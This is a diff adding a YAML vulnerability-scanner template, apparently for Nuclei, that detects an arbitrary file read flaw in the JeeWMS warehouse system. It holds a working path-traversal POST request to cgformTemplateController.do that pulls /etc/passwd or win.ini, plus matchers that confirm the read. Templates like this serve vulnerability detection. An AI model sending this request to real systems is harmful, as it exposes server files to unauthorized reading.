@@ -1,0 +1,37 @@
+id: poc-yaml-jeewms-wmsapicontroller-do-anyfile-read
+info:
+  name: JeeWMS Arbitrary File Read Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: file-read
+  description: |
+    JeeWMS wmsApiController.do is vulnerable to an arbitrary file read vulnerability, allowing attackers to access sensitive files on the server.
+
+variables:
+  paths:
+    - ../../../../../../../../../../etc/passwd
+    - ../../../../../../../../../../c:/Windows/win.ini
+
+http:
+  - method: POST
+    path:
+      - "/wmsApiController.do/../cgformTemplateController.do?showPic=11"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: |
+      code=../../../../&path={{paths}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: regex
+        regex:
+          - "root:.*:/bin"
+          - "\\[files\\]"
+          - "\\[fonts\\]"
+        condition: or
+      - type: word
+        words:
+          - image//etc/passwd
+        part: header
